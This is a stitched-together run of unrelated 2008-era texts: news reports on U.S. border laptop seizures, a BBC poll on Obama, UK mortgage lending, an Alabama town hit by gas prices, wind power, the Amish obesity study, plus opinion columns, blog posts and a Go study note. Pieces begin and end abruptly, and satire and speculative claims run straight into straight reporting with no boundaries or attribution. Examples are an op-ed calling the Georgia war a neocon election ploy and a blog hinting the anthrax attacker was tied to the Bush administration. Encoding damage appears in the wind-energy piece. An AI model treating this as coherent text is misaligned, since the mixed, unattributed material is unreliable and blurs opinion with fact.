He said the challenge was to get rapidly developing countries such China , India and Brazil behind the idea .

Airport threat to your laptop : U.S. also gets power to seize iPods and mobiles in new anti-terror measure
Travellers to the U.S. could have their laptops and other electronic devices seized at the airport under new anti-terror measures .
Federal agents have been granted powers to take such devices and hold them as long as they like .
They do not even need grounds to suspect wrongdoing .
New powers : The Department for Homeland Security in the U.S. have been granted powers to seize laptops and other electronic devices at airports under new anti-terror measures
The Department of Homeland Security said the policies applied to anyone entering the country by land , sea or air , including U.S. citizens .
The extent of the new powers , which have been secretly in place for some time , was revealed yesterday in the Washington Post .
They cover hard drives , flash drives , mobile phones , iPods , pagers , beepers , and video and audio tapes , as well as books , pamphlets and other written materials , the report said .
Federal agents must take measures to protect business information and lawyer - client privileged material .
Copies of data must be destroyed when a review is completed and no probable cause exists to keep the information .
But agents are allowed to share the contents of seized computers with other agencies and private entities for data decryption and ' other reasons ' .
Copies sent to non-federal entities must be returned to the DHS , but there is no limitation on authorities keeping written notes or reports about the materials .
The new powers came to light under pressure from civil liberties and business travel groups after increasing numbers of travellers reported that they had laptops , phones and other digital devices removed and examined .
The development was described as ' truly alarming ' by Wisconsin Democrat Senator - Russell Feingold , who is investigating U.S. border search practices .
He said he intends to introduce legislation that would require reasonable suspicion for border searches , as well as prohibit profiling on race , religion or national origin .
DHS officials insisted the policies were reasonable and necessary to prevent terrorism .
They said they had been disclosed only because of public interest .
But Greg Nojeim , senior counsel at the Center for Democracy and Technology , said it was alarming that the policies ' do n't establish any criteria for whose computer can be searched . '
He added : ' They are saying that they can rifle through all the information contained in a traveller 's laptop without having even a smidgeon of evidence that the traveller is breaking the law . '
Homeland Security Secretary Michael Chertoff said last month that ' the most dangerous contraband is often contained in laptop computers or other electronic devices ' .
Searches had uncovered ' violent jihadist materials ' as well as images of child pornography .
In an article for U.S.A Today , Chertoff wrote that 'as a practical matter , travellers only go to secondary [ a more thorough examination ] when there is some level of suspicion . '
He said legislation setting a particular standard for searches would have a ' dangerous , chilling effect ' because it could contradict assessments by officers , often made in a split second .
In April , the U.S. Court of Appeals in San Francisco upheld the government 's power to conduct searches of an international traveller 's laptop without suspicion of wrongdoing .
I have some exciting news to share .
( But please , guys and gals , do n't get TOO excited .
This is what it is , and so far that 's all it is , so do n't make any assumptions ) .
HBO has just exercised its option , and purchased the television rights to A GAME OF THRONES .
For those of you who do n't know Hollywood , an option gives a production company the right to buy a property ( a book , a screenplay , whatever ) at a certain agreed - upon price for a certain period of time ( a year , six months , whatever ) .
When that time runs out , they can let the option lapse , renew the option , or exercise the option and buy the property .
The last is what HBO has just done .
What they have NOT done is greenlight the project .
A GAME OF THRONES remains in development .
They 're still budgeting , still looking at locations ( Spain and the Czech Republic at present , I hear ) .
No decision has been reached , so any celebration would be premature .
In Hollywood it is always best not to assume something is going to happen until it actually happens .
Even so ... this is a very encouraging sign , and one that suggests a continued high level of enthusiasm and commitment for A GAME OF THRONES at HBO .
So keep your fingers crossed .

While Obama was spending three hours watching “ The Dark Knight ” five time zones away , and going to a fund - raiser featuring “ Aloha attire ” and Hawaiian pupus , Hillary was busy planning her convention .
You can almost hear her mind whirring :
She ’s amazed at how easy it was to snatch Denver away from the Obama saps .
Like taking candy from a baby , except Beanpole Guy does n’t eat candy .
In just a couple of weeks , Bill and Hill were able to drag No Drama Obama into a swamp of Clinton drama .
Now they ’ve made Barry ’s convention all about them  their dissatisfaction and revisionism and barely disguised desire to see him fail .
Whatever insincere words of support the Clintons muster , their primal scream gets louder :
He ca n’t win !
He ca n’t close the deal !
We told you so !
Hillary ’s orchestrating a play within the play in Denver .
Just as Hamlet used the device to show that his stepfather murdered his father , Hillary will try to show the Democrats they chose the wrong savior .
US Democratic presidential candidate Barack Obama may be struggling to nudge ahead of his Republican rival in polls at home , but people across the world want him in the White House , a BBC poll said .
All 22 countries covered in the poll would prefer to see Senator Obama elected US president ahead of Republican John McCain .
In 17 of the 22 nations , people expect relations between the US and the rest of the world to improve if Senator Obama wins .
More than 22,000 people were questioned by pollster GlobeScan in countries ranging from Australia to India and across Africa , Europe and South America .
The margin in favour of Senator Obama ranged from 9 per cent in India to 82 per cent in Kenya , while an average of 49 per cent across the 22 countries preferred Senator Obama compared with 12 per cent preferring Senator McCain .
Some four in 10 did not take a view .
" Large numbers of people around the world clearly like what Barack Obama represents , " GlobeScan chairman Doug Miller said .
" Given how negative America 's international image is at present , it is quite striking that only one in five think a McCain presidency would improve on the Bush administration 's relations with the world . "
In the United States , three polls taken since the Republican party convention ended on Thursday ( local time ) show Senator McCain with a lead of 1 to 4 percentage points - within the margin of error - and two others show the two neck - and - neck .
The countries most optimistic that an Obama presidency would improve relations were America 's NATO allies , including Australia ( 62 per cent ) .
A similar BBC / Globescan poll conducted ahead of the 2004 U.S presidential election found that , of 35 countries polled , 30 would have preferred to see Democratic nominee John Kerry , rather than the incumbent George Bush , who was elected .
A total of 23,531 people in Australia , Brazil , Canada , China , Egypt , France , Germany , India , Indonesia , Italy , Kenya , Lebanon , Mexico , Nigeria , Panama , the Philippines , Poland , Russia , Singapore , Turkey , the UAE , Britain and the United States were interviewed face - to - face or by telephone in July and August 2008 for the poll .

Dear CEOs of U.S. airlines :
I want to say thanks for the July 10 email you sent to all your customers seeking to explain why today 's air travel experience is so painful .
The letter , signed by 12 of you , explained that " oil speculators " -- presumably by betting on future oil prices -- are killing your industry and thus requested that I , as a consumer , pressure Congress to rein in this " unchecked " market " manipulation . "
I admit that just lately I 'd begun to feel that flying was something akin to having my intestines fished out with a long hook .
Actually , I 'd been wondering whom to blame for the fact that it would probably be cheaper , easier and maybe even faster to drive to wherever I want to go than to board one of your planes .
Suddenly , all is clear .
I now understand that it is oil speculators who set your hiring policies and who must have outlined the three types of people you may employ : those who grunt at me , those who sigh deeply as if my presence has ruined their day and those who are actively hostile to my smallest request .
I 'm betting those speculators at the Chicago Mercantile Exchange were behind the retention of that counter agent who recently placed me , my 3 - year - old and my infant in completely different rows for a cross-country flight , instructing me to " sort it out at the gate . "
The CME undoubtedly also hired the gate agent who told me to " fix it on the plane . "
Ditto the stewardess who yelled at me for not dealing with this problem before I boarded and then ordered a dozen people to shift seats , delaying our departure .
Not that it mattered , since we sat on the runway for two hours .
But it 's good to know what donkey I can pin that tail on .
Opinion
Georgia war is a neocon election ploy
Is it possible that this time the October surprise was tried in August , and that the garbage issue of brave little Georgia struggling for its survival from the grasp of the Russian bear was stoked to influence the U.S. presidential election ?
Before you dismiss that possibility , consider the role of one Randy Scheunemann , for four years a paid lobbyist for the Georgian government , ending his official lobbying connection only in March , months after he became Republican presidential candidate Sen .
John McCain 's senior foreign policy adviser .
Previously , Scheunemann was best known as one of the neoconservatives who engineered the war in Iraq when he was a director of the Project for a New American Century .
It was Scheunemann who , after working on the McCain 2000 presidential campaign , headed the Committee for the Liberation of Iraq , which championed the U.S. Iraq invasion .
There are telltale signs that he played a similar role in the recent Georgia flare - up .
How else to explain the folly of his close friend and former employer , Georgian President Mikhail Saakashvili , in ordering an invasion of the breakaway region of South Ossetia , which clearly was expected to produce a Russian counter - reaction .
It is inconceivable that Saakashvili would have triggered this dangerous escalation without some assurance from influential Americans he trusted , like Scheunemann , that the United States would have his back .
Scheunemann long guided McCain in these matters , even before he was officially running foreign policy for McCain 's presidential campaign .
In 2005 , while registered as a paid lobbyist for Georgia , Scheunemann worked with McCain to draft a congressional resolution pushing for Georgia 's membership in NATO .
A year later , while still on the Georgian payroll , Scheunemann accompanied McCain on a trip to that country , where they met with Saakashvili and supported his bellicose views toward Russia 's Vladimir Putin .
Scheunemann is at the center of the neoconservative cabal that has come to dominate the Republican candidate 's foreign policy stance in a replay of the run-up to the war against Iraq .
These folks are always looking for a foreign enemy on which to base a new Cold War , and with the collapse of Saddam Hussein 's regime , it was Putin 's Russia that came increasingly to fit the bill .
Yes , it sounds diabolical , but that may be the most accurate way to assess the designs of the McCain campaign in matters of war and peace .
There is every indication that the candidate 's demonization of Putin is an even grander plan than the previous use of Hussein to fuel American militarism with the fearsome enemy that it desperately needs .
McCain gets to look tough with a new Cold War to fight while Democratic presidential candidate Sen.
Barack Obama , scrambling to make sense of a more measured foreign policy posture , will seem weak in comparison .
Meanwhile , the dire consequences of the Bush legacy McCain has inherited , from the disaster of Iraq to the economic meltdown , conveniently will be ignored .
But it will provide the military - industrial complex , which has helped bankroll the neoconservatives , with an excuse for ramping up a military budget that is already bigger than that of the rest of the world combined .
What is at work here is a neoconservative , self - fulfilling prophecy in which Russia is turned into an enemy that ramps up its largely reduced military , and Putin is cast as the new Joseph Stalin bogeyman , evoking images of the old Soviet Union .
McCain has condemned a " revanchist Russia " that should once again be contained .
Although Putin has been the enormously popular elected leader of post - Communist Russia , it is assumed that imperialism is always lurking , not only in his DNA but in that of the Russian people .
How convenient to forget that Stalin was a Georgian , and indeed if Russian troops had occupied the threatened Georgian town of Gori , they would have found a museum still honoring their local boy , who made good by seizing control of the Russian revolution .
Indeed five Russian bombs were allegedly dropped on Gori's Stalin Square on Tuesday .
It should also be mentioned that the post -Communist Georgians have imperial designs on South Ossetia and Abkhazia .
What a stark contradiction that the United States , which championed Kosovo 's independence from Serbia , now is ignoring Georgia 's invasion of its ethnically rebellious provinces .
For McCain to so fervently embrace Scheunemann 's neoconservative line of demonizing Russia in the interest of appearing tough during an election is a reminder that a senator can be old and yet wildly irresponsible .
WASHINGTON ( CNN ) -- Republican Rep. Ron Paul of Texas called on voters to back a third - party candidate for president Wednesday , rejecting his party 's nominee and offering equally harsh words for the Democratic candidate .
Paul , who unsuccessfully sought the Republican presidential nomination this year , told supporters at the National Press Club in Washington that he is not endorsing GOP nominee Sen. John McCain or Democratic nominee Sen. Barack Obama .
Instead ,
Paul will give his seal of approval to four candidates : Green Party nominee Cynthia McKinney , Libertarian Party nominee Bob Barr , independent candidate Ralph Nader and Constitution Party candidate Chuck Baldwin .
Paul said he 's supporting the third - party candidates because the two major parties and media had " colluded " to avoid discussing issues and falsely presenting the difference between McCain and Obama as real .
" I 've come to the conclusion , after having spent many years in politics , is that our presidential elections turn out to be more of a charade than anything else , and I think that is true today .
It is a charade , " he said .
Paul offered an open endorsement to the four candidates because each signed onto a policy statement that calls for " balancing budgets , bring troops home , personal liberties and investigating the Federal Reserve , " an aide to the congressman said .
Paul said a strong showing by the third - party candidates would express the public 's frustration with the current system .
" I have no doubt that the majority is on our side , " Paul added , citing public opinion polls .
" We represent the majority of the American people . "
Paul said that he had received a call from the McCain campaign Tuesday asking for his endorsement .
Paul 's response : " I do n't like the idea of getting 2 to 3 million people [ Paul supporters ] angry at me . "
McCain 's aides argued that the Texas Republican should endorse McCain because he would do a " little less harm " than Obama , Paul said , but " we just do n't need to do that anymore . "
" If you ever get to the point where you believe the two parties are essentially the same , if the majority is outside of the establishment , it 's not very democratic .
The process is not working , " Paul said .
Paul attacked Obama , saying , " He 's not for change , " and the congressman argued that his efforts would help the Republican Party .
" If the Republican side realized what I 'm trying to do , they should be funding me , " Paul said .
Paul failed in his bid for the Republican nomination , but he found a large , diverse audience for his anti-war and anti-tax messages .
The Texas congressman 's campaign was fueled by an on - line , grass - roots fundraising operation .
Throughout the campaign , Paul supporters called on others to join the " Ron Paul Revolution . "
At the Republican National Convention last week in St. Paul , Minnesota , Paul supporters threw their own party in Minneapolis .
iReport.com : See Ron Paul signs raised high at the " counter - convention "
Paul , who said he entered the presidential race reluctantly , told the roaring audience , " I lost my skepticism .
I hope you lost your apathy . "
" I did not want to run people 's lives .
I did not want to run the economy and I did not want to run the world .
I did n't have the authority to do it , and I did n't have the Constitution behind me to do it , " Paul said .

CHICAGO ( AP ) 
Maybe you can blame being fat on your genes .
But there 's a way to overcome that family history — just get three to four hours of moderate activity a day .
Sound pretty daunting ?
Not for the Amish of Lancaster County , Pa. , who were the focus of a new study on a common genetic variation that makes people more likely to gain weight .
It turns out the variant 's effects can be blocked with physical activity — lots of it .
Scientists believe about 30 % of white people of European ancestry have this variant , including the Amish , and that may partly explain why so many people are overweight .
HEALTH BLOG :
The skinny on fitness and nutrition
But fighting that fat factor may be easier in the Amish community 's 19th century rural lifestyle .
They do n't use cars or modern appliances .
Many of the men are farmers and carpenters , and the women , who are homemakers , often care for several children .
The researchers found that Amish people with the genetic variant were no more likely to be overweight than those who had the regular version of the gene — as long as they got three to four hours of moderate activity every day .
That included things like brisk walking , housecleaning and gardening .
And while physical activity is recommended for just about everyone , the study suggests that people with the gene variation need to be especially vigilant about getting exercise .
" These findings emphasize the important role of physical activity in public health efforts to combat obesity , particularly in genetically susceptible people , " the authors wrote in Monday 's Archives of Internal Medicine .
Study co-author Dr. Soren Snitker of the University of Maryland acknowledged that it 's unrealistic to expect most people to shun modern conveniences and return to a 19th century lifestyle for the sake of staying trim .
But he said every little bit helps , and that adding an extra few hours of activity daily might not be as hard as it seems .
Instead of watching TV for a few hours at night , take a brisk walk , he suggested .
Or use stairs instead of elevators , walk instead of driving , or take up a structured exercise such as swimming .
Previous research based on self - reporting of physical activity has produced similar results .
The new study used a more reliable measure — battery - operated monitoring devices worn round - the - clock for a week , said lead author Evadnie Rampersaud of the University of Miami .
More research is needed to see if similar results would be found in other racial and ethnic groups , said Amy Zlot , a genetics researcher with Oregon 's Department of Human Services , who was not involved in the study .
The Amish study involved 704 people ; blood samples determined which of those had a variation in the FTO gene linked to obesity .
Among those with the variant , those who got about three or four hours of moderate physical activity a day weighed up to about 15 pounds less on average than the least active people .
The least active group would be comparable to Americans who get little exercise beyond normal activities of daily living , Snitker said .
The authors said it is not clear how the FTO gene influences excess weight , but it is believed to be involved in the function of a protein that may affect how the body regulates food intake .
" It 's only if you 're not active that the gene hurts , " Snitker said .
" If you are active , then either way , it does n't matter whether you have the gene or not . "
So far , blood tests identifying the gene variant are only available for research .
Experts say there are likely many other genetic differences that also influence obesity , so it is too soon to recommend routine testing for the general public .
Dr. Joel Hirschhorn , a genetics and obesity researcher at Children 's Hospital Boston , said people should not interpret the study to mean , " I do n't have this gene variant so I do n't need to be physically active . "
He noted that other obesity gene variants might also be affected by physical activity , which has benefits beyond helping people stay trim .

CAMDEN , Ala .�( CNNMoney.com ) -- Corey Carter spends a quarter of his paycheck on gas .
The 30 - year old Carter , who earns $ 7 an hour making car parts for a Hyundai factory near Montgomery , Ala. , spends $ 65 a week on gas , double what it cost just a few years ago .
Paying $ 30 more for gas out of a $ 240 paycheck makes a big difference .
" Going out to eat , going to the movies , you can't do stuff like that , " says Carter , filling up his Firebird at a BP station in Camden , a quiet southern town 80 miles southwest of Montgomery .
" You 're working for gas now . "
Carter , and other residents that live around Camden , are having a particularly hard time - they devote more of their budget for gas than anyone else in the United States .
So , like Americans everywhere , people here are cutting back on spending , and that 's threatening to send - or may have already sent - a shaky economy into recession .
For people like Carrie Frye , 33 , a mother who commutes 70 miles each day , the choice is about much more than simply cutting back on entertainment .
Frye works at a factory in Selma , Ala. , making lawn chair cushions .
If she makes her production quota , she might bring in $ 329 a week .
If not , it 's $ 220 .
Either way , she says the $ 60 a week she now spends in gas comes out of money for food , the doctor , and buying clothes for her kids .
" I just hope they do n't grow that fast , " she says , filling her tank of her Jeep Cherokee at the Camden BP .
Camden is a classic rural southern town - men sit on porches , shopping gets done at the general store .
The county bills itself as the " hunting and fishing capital of Alabama . "
The main industries here are logging , farming , and , more recently , business related to the Hyundai plant which opened in 2005 .
But the county is poor - household income of $ 26,000 is nearly half the national average .
And people have to travel a long way to work .
The combination of low wages and long travel times means the people of Camden , for the second year in a row , spent a higher portion of their income on gas than anyone else in the country , according to a study from the Oil Price Information Service , a research firm that tracks data for AAA .
In Camden , drivers put 13 % of every paycheck right into the gas tank .
In wealthy towns around New York City , people spend less than 2 % of their income on gas .
For local businesses , an extra dollar spent in the tank means one not spent at the restaurant or hardware store .
[ Customer 's ] budgets are tightening , " says William Malone , head of the local Chamber of Commerce .
" They 're cutting back any way they can . "
Malone , who also runs a local insurance company , said he 's seen people cut back on their insurance plans , purchasing them with less coverage or higher deductibles .
He 's also seen a growing interest in smaller cars , a claim backed up by the local Chevy dealer .
Not every business is struggling .
A worker behind the counter at the local bait and tackle shop says they 've had a bumper year .
Evidently , folks will hunt and fish no matter what the economy 's doing - maybe even more so if they 're out of work .
But at Uncle Redd's , a barbeque joint on the way out of town , owner Andrea Finklea says over 100 people a day would come in for the chicken , ribs , and mac n' cheese .
Now , they 're lucky to get 65 .
" We 're planning on cutting back on employees hours , that 's a bad thing , " says Finklea .
Jimmy Pugh runs the Coast to Coast Tru Value in the center of town , although the shop 's hardware store moniker belies the merchandise on hand - the wood floor , tin ceiling general store sells everything from toys and tools to electronics , guitars and furniture .
Pugh says his business is off 10 to 15 % for the last few months , and he too may have to cut back on hours .
" It 's the overall economy , but gas prices are having a big effect on it , " he says .
" I just do n't know where it 's headed . "
The dip in business is hitting the town 's coffers .
Camden 's seen its revenue from sales receipts drop 5 % in December , the first decline in seven years , according to Mayor Henrietta Blackmon .
In February revenue fell another 2.5 % .
Despite these figures , a tax hike is n't in the cards yet .
But for the people of Camden , and other communities across the nation struggling with declining home values , tightening credit and rising unemployment , high gas prices are just another burden as the economy teeters on the brink of recession .
An Army scientist who may have mailed anthrax to various news organizations and government officials in 2001 is dead of an apparent suicide .
( Despite the fact that he was reportedly a committed Catholic , for whom I think suicide would have been a mortal sin , letters to the editor show that he was obviously confused . )
Though friends and family claim that Bruce E. Ivins was innocent and the victim of FBI harassment , he also had been accused recently of having “ a history dating to his graduate days of homicidal threats , actions , plans , threats & actions towards therapist . ”
Perhaps I ’ve just watched too many episodes of “ The X - Files , ” “ Prison Break ” and similar programs , but If the accusation about long - time violent tendencies is true , one might wonder why Ivins was allowed to work in Army biodefense labs–WITH ANTHRAX , FOR GOD ’S SAKE–for EIGHTEEN FREAKING YEARS !
One would hope it was merely oversight or stupidity and not related in any way to all the help Ivins allegedly gave the Bush administration in its efforts to curb civil liberties in America and start a war in Iraq .
Perhaps no one has covered the anthrax issue better than Glenn Greenwald , who today offers another detailed and thought - provoking piece ( one of a series of such stories ) .
As Greenwald writes , “ It was anthrax–sent directly into the heart of the country ’s elite political and media institutions , to then - Senate Majority Leader Tom Daschle ( D - SD ) , Sen .
Pat Leahy ( D - Vt ) , NBC News anchor Tom Brokaw , and other leading media outlets –that created the impression that social order itself was genuinely threatened by Islamic radicalism . ”
Greenwald previously has pointed out that ABC played a significant role in the false impression that Saddam Hussein and Iraq may have been involved in the anthrax attacks .
I have suggested to many people over the years ( though not previously in writing ) , that if the culprit was ever found , he or she would likely be someone or strongly sympathetic to–if not associated with –the Bush administration .
I did note a couple of years ago in my first book that the anthrax scare came just before Congress was asked to pass the USA PATRIOT Act .
You ’ll notice that the targeted Congressmen were somewhat liberal members of Congress , who might some might have expected to opposed the administration ’s attempts to run roughshod over civil liberties .
Apparently the terrorist neglected to send an envelope to Russ Feingold , the only Senator to oppose the act ( which passed 357 - 66 in the House ) .
Many aspects of the Patriot Act had been proposed before 9/11 , but Congress hurried to push it through in October 2001 , just after the anthrax mailings .
President George W. Bush created the Office of Homeland Security at about the same time , and began a concerted effort to link Hussein and Iraq to anthrax and other weapons of mass destruction .
John McCain made the same connection : thinkprogress has video .
Perhaps the anthrax culprit has been identified , is dead , and is no longer a threat .
But so far the 2001 anthrax scare has helped kill thousands of American soldiers , tens of thousands of Iraqis , and American civil liberties .
AUGUST 3 UPDATE : Greenwald continues his excellent coverage of the issue , asking important questions about journalists ’ knee - jerk protection of even obviously dishonest government sources .
NM GOP leader under fire for ' Hispanics above blacks ' slur David Edwards and Muriel Kane
Published : Monday September 22 , 2008
Print This Email This A local Republican Party leader in New Mexico has set off a firestorm by suggesting in an interview that Hispanics are racists who wo n't vote for a black candidate .
Now even the state Republican chairman is calling for his resignation .
Fernando C' de Baca , who heads the GOP in Bernalillo County , was quoted by BBC reporter Jon Kelly on Friday as saying that even though the polls show Barack Obama with a substantial lead over John McCain among Hispanic voters , " The truth is that Hispanics came here as conquerors .
African - Americans came here as slaves .
...
Hispanics consider themselves above blacks .
They wo n't vote for a black president . "
The Hispanic community has reacted to de Baca 's remarks with anger .
Ralph Arellanes of the Hispanic Roundtable of New Mexico told CNN , " I 'm insulted and I 'm outraged . "
The Obama campaign issued a similar statement by the speaker of the New Mexico House , Democrat Ben Lujan , saying , " I am outraged .
...
It is an insult to the Hispanic community and to all of the voters of New Mexico . . "
Political blogger Peter St. Cyr told KOAT
News in Albuquerque that de Baca had phoned him on Saturday evening to apologize for the remarks , insisting they were taken out of context and represented something his grandfather had told him 60 years ago .
De Baca , who served in Vietnam and with the US Army Airborne Intelligence Corps , has a long history of service to the Republican Party .
He was appointed a Deputy for Hispanic Affairs by Richard Nixon in 1974 and worked in the Ford White House for over two years .
In 1985 , he became chairman of the Republican National Hispanic Assembly .
However , even Republicans are now rushing to disavow de Baca 's words .
The chairman of the New Mexico Republican Party , Allen Weh , told KOAT News in Albuquerque that " the comments were inappropriate , they were offensive to a lot of people " and stated that de Baca needs to step down for the good of the party .

The value of new mortgage lending plummeted in August , figures showed today , as falling confidence in the housing market and the squeeze on credit continued to take their toll .
The Bank of England said net mortgage lending - the value of loans advanced during the month once repayments and redemptions are taken into account - plummeted to just £ 143 m during the month .
This is less than 5 % of the £ 3bn of net lending in July and the lowest level since records began in April 1993 .
The figure reflects several months of falling approvals for loans for house purchases and remortgages , with recent months showing a steady decline in the number of new deals agreed .
There are no signs of lending levels recovering , with the figures showing the number of mortgages approved for house purchases falling to a record low in August .
The Bank said 32,000 mortgages for purchases had been approved over the month , down from July 's record low of 33,000 and well below the previous six - month average of 49,000 .
These approvals were worth a total of £ 4.1bn , down from £ 4.3bn in July and below the £ 6.8 bn averaged in the previous six months .
Remortgage numbers also fell , with 64,000 loans worth £ 8.7bn approved during the month , compared with an average of 88,000 in the previous six months .
The value of all types of mortgage approved in August was only £ 13.6 bn , less than half of the figure for August last year of £ 30.2bn and the lowest for nearly seven years .
August 's figures for home purchase approvals are likely to have been hit by speculation over changes to stamp duty rules , which were only confirmed at the start of this month .
During the summer , estate agents and surveyors said they believed buyers were delaying entering the market until the government confirmed if there would be any changes to the rules .
Howard Archer , chief UK economist at Global Insight , said : " The dire Bank of England mortgage data show that housing market activity is being decimated by the highly damaging combination of stretched buyer affordability and tight lending practices .
" Widespread expectations that house prices will continue to fall markedly for some considerable time to come is also significantly limiting housing market activity , as is heightened concern over the economic outlook and job prospects . "
The recent turmoil in the financial market , which resulted in the takeover of Halifax 's owner HBOS and today 's nationalisation of Bradford & Bingley has pushed up mortgage rates in recent days , making life even harder for buyers .
Last week , HSBC and Woolwich increased rates on some of their deals , and today Lloyds TSB announced it was raising rates on two - and three - year fixed - rate mortgages by up to 0.26 % .
Separate figures from the Building Societies Association showed the value of mortgages approved by its lenders fell by 31 % in the 12 months to August to £ 2.8bn .
For the third month running net lending by societies was in negative figures , at - £ 38 m .
In August 2007 net lending was worth £ 771m .
Money continues to come into building society savings accounts , although deposits halved over the month from £ 1.4bn in July to £ 771 m in August .
A DISTRAUGHT teenager was ecstatic when police told her they had found her stolen scooter just yards away from the family home – until she was told she would have to pay a hefty sum to get it back .
Faye Bradley ’s scooter was found abandoned about 200 yards from her home in Wilberforce Avenue , Clifton , was towed all the way to the other side of the city and the recovery fee is more than the hard - up teenager can afford .
But North Yorkshire Police said that it was force policy for all stolen vehicles to be compounded .
Faye , 18 , was gutted when her prized possession – a Honda Barley 50 cc scooter – was stolen from her home , last Sunday evening .
Police rang the teenager – who uses her trusty scooter to travel to Askham Bryan College where she is studying for a national diploma in animal management – the next morning to say they had located the vehicle on the next street .
But her joy was short - lived when she was told that the scooter had been taken to a compound in Dunnington , and she would have to pay to get it back .
She was charged £ 105 , after being unable to afford to collect the vehicle after five days , she has had had another £ 60 bill added to the amount – £ 12 a day for storage .
Today her distraught mum , Amanda Bradley , has said she is devastated that , as “ a victim of crime ” , Faye has been landed with such a large bill to collect the stolen property .
” It is just not fair that we have to pay to get our own property back after it was snatched from her home , ” the Amanda said .
Faye ’s brother , 22 - year - old Lee , added that he is furious on behalf of his sister .
“ If the police had called us when it was stolen we could have collected it straight away , ” he said .
“ Instead they just impounded it and expect her to foot the bill . ”
Lee said Faye desperately needs the scooter to get to college .
“ The scooter was an old one , ” he said .
“ It ’s not worth much , and , as Faye ’s excess is £ 250 , it is just not worth getting back .
“ It is such a shame , my sister is really bright and she will really struggle to get to college now . ”
A North Yorkshire Police spokesman said it was a national policy to send recovered stolen vehicles to a compound .
He said : “ The Road Traffic Regulation Act 1984 and the Removal and Disposal of Vehicles Regulations 1986 give the police power to remove vehicles in certain situations .
“ This includes vehicles which ‘ have been abandoned without lawful authority ’ .
“ This part of the powers covers stolen motor vehicles that have been abandoned . ”
Thats right people , put on your best Doc Brown voice and say it with me 1.21 jiggawatts 20,000 megawatts !
( and yes before you complain I know he says jiggawatt instead of the proper gigawatt take it up with the movie ) .
The U.S. wind industry has raced past the 20,000 - megawatt ( MW ) installed capacity milestone , achieving in two years what had previously taken more than two decades , the American Wind Energy Association ( AWEA ) said today ( the 10,000 - MW mark was reached in 2006 ) .
Wind now provides 20,152 MW of electricity generating capacity in the U.S. , producing enough electricity to serve 5.3 million American homes or power a fleet of more than 1 million plug - in hybrid vehicles .
â€ œWind energy installations are well ahead of the curve for contributing 20 % of the U.S. electric power supply by 2030 as envisioned by the U.S. Department of Energy , â€ said AWEA Executive Director Randall Swisher .
â€ œHowever , the looming expiration of the federal renewable energy production tax credit ( PTC ) less than four months from now threatens this spectacular progress .
The PTC has been a critical factor in windâ€™s very rapid growth as a part of the nationâ€™s power portfolio.â€ 
The PTC is currently set to expire at the end of 2008 .
Swisher and other wind industry leaders noted the 20,000 - MW milestone from Minneapolis , where the Republican National Convention is currently being held .
Joining Swisher in Minneapolis were AWEA President Jim Walker , of enXco , as well as officials from other leading companies in the wind industry , including Xcel Energy , Vestas Americas A/S , Renewable Energy Systems Americas , and Horizon Wind Power .
Xcel Energy , the host utility for both the Republican convention and the Democratic National Convention held last week in Denver , is providing sufficient wind - generated electricity from its system to power both events .
A 131 - foot wind turbine blade , which has been on display at both conventions , was manufactured by wind turbine maker Vestas at a U.S. blade factory .
The 20,000 MW of wind power installed in the U.S. today can generate as much electricity every year as 28.7 million tons of coal or 90 million barrels of oil .
Wind generation currently displaces 34 million tons of carbon dioxide annually , equivalent to taking 5.8 million vehicles off the road .
A U.S. Department of Energy study released in May found that wind could provide 20 % of U.S. electricity by 2030 .
At that level , wind power would support 500,000 jobs and reduce greenhouse gas emissions as much as taking 140 million vehicles off the road .
To put this into perspective geologists think that there is about 10.4 billion barrels of crude in the arctic national wildlife reserve ( ANWR ) .
Republicans will tell you that if we start drilling there today , in about 10 years (! ) we will start seeing oil and in about 18 years (!!) it will peak at about 860,000 barrels a day .
So it will take ten years to set up , produce almost no oil , 18 years to peek , and even with the boost reports show that America would still have to import 70 % of its oil , and that the price difference per barrel would be 30 – 50 CENTS .
If we continue to build wind power at the current rate ( 5000 mw a year ) , by 2025 ( the date ANWR would peek in production if we started today ) we could build 105,000 MW of wind energy by 2025 .
Using the numbers above that would be an offset of 472,500,000 Million barrels of oil .
But , but but , hey is n’t that not as much as what we would get with drilling !
Good job , in fact thats about half as much , but thats not the whole picture .
Since the 70’s we have increased efficiency in this country about 1 - 2 % year .
so in 18 years we could assume 20 - 35 % improvement in efficiency ( that assumes we do n’t pass any helpful laws to speed things up ) .
So we would need less oil ( hopefully ) , and we have yet to factor into the picture what burning all that oil will do to this country .
We have to think about things like global warming , wars for oil , sea level rise , pollution , oil spills , climate refugees , virus and pest spreading to new warmer climates , loss of crop land , habitat loss , ocean acidification , mercury levels in fish , energy security etc .
We also are not taking into account the increase in the use of solar / geothermal / biomass / tidal etc. energy sources .
All of which make renewable energy the “ cheaper ” option ( it would still cost a lot of money ) .
Of course this whole comparison misses a vital point .
Even if you drilled for oil , in ANWR , off the coast , everyplace you could think of , eventually the oil will run out .
All oil supplies are FINITE .
When the oil runs out , the wind will still blow .
Wind energy is an investment in the future , oil is just a quick fix .
If you have ever put money away in a college fun for a child that is only a few years old you know that 20 - 30 years is not that long of a time to plan .
Lets plan to keep America well powered for the next 1000 years ( at least ) .
The U.S. is now the world leader in wind electricity generation .
While Germany has more generating capacity installed ( about 23,000 MW ) , the U.S. is producing more electricity from wind because of its much stronger winds .
AWEA expects over 7,500 MW of new wind capacity to be added in 2008 , expanding Americaâ€™s wind energy fleet by 45 % and bringing total U.S. capacity to some 24,300 MW .
Although 20,000 MW is an important milestone , wind power provides just over 1.5 % of the nationâ€™s electricity , far below the potential identified by experts .
Still , it is one of the fastest - growing electricity sources today , providing 35 % of the total new capacity added in 2007 ( second only to natural gas ) .
The U.S. had 1,000 MW of wind power installed by 1985 ; 2,000 MW installed by 1999 ; and 5,000 MW by 2003 .
Its first 10,000 MW was installed by mid-2006 .
According to the U.S. Department of Energyâ€™s 20 % Wind Energy by 2030 report , wind power is capable of becoming a major contributor to Americaâ€™s electricity supply over the next two decades .
As an inexhaustible domestic resource , wind strengthens our energy security , improves the quality of the air we breathe , slows climate change , and revitalizes rural communities with good high paying jobs .
Studying problems is a way to train us , to solidly improve our capabilities to read during actual games .
Often we want to do big things without doing the small necessary things that big things need .
Same in baduk , often we want to be a strong player but we do n't work enough to read correctly , to see what is really going to happen .
To use this problems collection you have to try them every day and step by step you will find in yourself a new strength , self - confidence and you will " feel " the game , the natural flow of the stones .
Studying problems is like learning words when mastering a foreign language .
The more words you add to your vocabulary the more comfortable you feel speaking the language .
Solving
Go problems has nothing to do with sitting behind a Go board in a cold and dark attic , sweating for hours while trying to solve one position .
Again it is quite similar to learning foreign words : you go over them , read the translation ( solution ) and once the whole list is completed you check how many you actually remembered .
You repeat this as long as you feel like it .

